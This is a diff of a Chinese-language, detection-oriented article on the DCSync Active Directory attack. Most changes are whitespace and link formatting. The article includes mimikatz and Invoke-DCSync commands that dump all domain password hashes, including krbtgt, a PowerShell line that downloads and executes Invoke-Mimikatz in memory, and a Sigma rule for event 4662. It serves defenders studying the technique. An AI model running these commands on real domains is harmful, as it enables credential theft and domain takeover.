@@ -6,7 +6,7 @@
 
 ### DCsync
 
-DCSync 是一种后期杀伤链攻击，允许攻击者模拟域控制器（DC）的行为，以便通过域复制检索密码数据。一旦攻击者可以访问具有域复制权限的特权帐户，攻击者就可以利用复制协议来模仿域控制器。 
+DCSync 是一种后期杀伤链攻击，允许攻击者模拟域控制器（DC）的行为，以便通过域复制检索密码数据。一旦攻击者可以访问具有域复制权限的特权帐户，攻击者就可以利用复制协议来模仿域控制器。
 
 ![img](https://s2.ax1x.com/2019/09/24/uk1Q6x.png)
 
@@ -17,12 +17,12 @@ DCSync 是一种后期杀伤链攻击，允许攻击者模拟域控制器（DC�
 一般来说，DCSYNC攻击的工作方式如下：
 
 1. 发现域控制器以请求复制。
-2. 使用[GetNCChanges](https://wiki.samba.org/index.php/DRSUAPI)  函数请求用户复制  。
+2. 使用[GetNCChanges](https://wiki.samba.org/index.php/DRSUAPI) 函数请求用户复制 。
 3. DC将复制数据返回给请求者，包括密码哈希值。
 
 ![img](https://s2.ax1x.com/2019/09/24/uk1ttH.gif)
 
-DCSync的经典用例   是作为[Golden Ticket](https://attack.stealthbits.com/how-golden-ticket-attack-works)  攻击的前身  ，因为它可用于检索KRBTGT HASH。
+DCSync的经典用例是作为[Golden Ticket](https://attack.stealthbits.com/how-golden-ticket-attack-works) 攻击的前身，因为它可用于检索KRBTGT HASH。
 
 ### 所需权限
 
@@ -36,7 +36,7 @@ DCSync的经典用例   是作为[Golden Ticket](https://attack.stealthbits.com/
 
 ## 测试案例
 
-DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash
+DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash.
 
 **利用条件：**
 
@@ -54,13 +54,13 @@ DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi�
 导出域内所有用户的hash：
 
 ```dos
-mimikatz.exe privilege::debug "lsadump::dcsync /domain:0day.org /all /csv" exit
+mimikatz.exe privilege::debug "lsadump::dcsync /domain:abcc.org /all /csv" exit
 ```
 
 导出域内administrator帐户的hash：
 
 ```dos
-mimikatz.exe privilege::debug "lsadump::dcsync /domain:0day.org /user:administrator /csv" exit
+mimikatz.exe privilege::debug "lsadump::dcsync /domain:abcc.org /user:administrator /csv" exit
 ```
 
 #### 2.powershell实现
@@ -69,13 +69,13 @@ mimikatz.exe privilege::debug "lsadump::dcsync /domain:0day.org /user:administra
 
 导出域内所有用户的hash：
 
-```ps
+```powershell
 Invoke-DCSync -DumpForest | ft -wrap -autosize
 ```
 
 导出域内administrator帐户的hash：
 
-```ps
+```powershell
 Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize
 ```
 
@@ -89,15 +89,15 @@ windows 安全日志
 
 ### 场景:在本地运行DCsync,利用powershell脚本Invoke-Mimikatz
 
- 在Windows域控服务器上启动powershell，然后下载Invoke-Mimikatz。 
+ 在Windows域控服务器上启动powershell，然后下载Invoke-Mimikatz。
 
-```ps
+```powershell
 iex (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
 ```
 
- 完成后，我们可以使用以下命令运行DCSync。 
+ 完成后，我们可以使用以下命令运行DCSync。
 
-```ps
+```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt /domain:0day.org"'
 ```
 
@@ -107,7 +107,7 @@ windows 安全日志，4662（在对象上已执行操作），特征值：*1131
 
 ## 检测规则/思路
 
- DCSync是一个强大的工具，在红色团队成员手中，对于蓝色团队成员而言，这是一场噩梦。对于蓝队，一切都不会丢失。停止这种攻击可能不可行，但可以将其检测出来。 
+ DCSync是一个强大的工具，在红色团队成员手中，对于蓝色团队成员而言，这是一场噩梦。对于蓝队，一切都不会丢失。停止这种攻击可能不可行，但可以将其检测出来。
 
 检测方法： 网络监控 、事件ID检测
 
@@ -122,7 +122,7 @@ logsource:
     product: windows
     service: security
 detection:
-    selection: 
+    selection:
         EventID: 4662 #在对象上已执行操作。
         Operationtype: 'Obeject Access' #操作>操作类型
         Access: '访问控制' #操作>访问
@@ -142,16 +142,30 @@ level: medium
 
 ## 参考推荐
 
-MITRE-ATT&CK-T1003：https://attack.mitre.org/techniques/T1003/
+MITRE-ATT&CK-T1003
 
-什么是DCSYNC？一个介绍：https://blog.stealthbits.com/what-is-dcsync/
+<https://attack.mitre.org/techniques/T1003/>
 
-域渗透——DCSync：https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/
+什么是DCSYNC？一个介绍
 
-DCsync利用原理：https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47
+<https://blog.stealthbits.com/what-is-dcsync/>
 
-powershell工具实现：https://gist.github.com/monoxgas/9d238accd969550136db
+域渗透——DCSync
 
-DCsysnc检测：https://yojimbosecurity.ninja/dcsync/ 
+<https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/>
 
-Active Directory复制：https://github.com/hunters-forge/ThreatHunter-Playbook/blob/master/library/active_directory_replication.md
+DCsync利用原理
+
+<https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47>
+
+powershell工具实现
+
+<https://gist.github.com/monoxgas/9d238accd969550136db>
+
+DCsysnc检测
+
+<https://yojimbosecurity.ninja/dcsync/>
+
+Active Directory复制
+
+<https://github.com/hunters-forge/ThreatHunter-Playbook/blob/master/library/active_directory_replication.md>
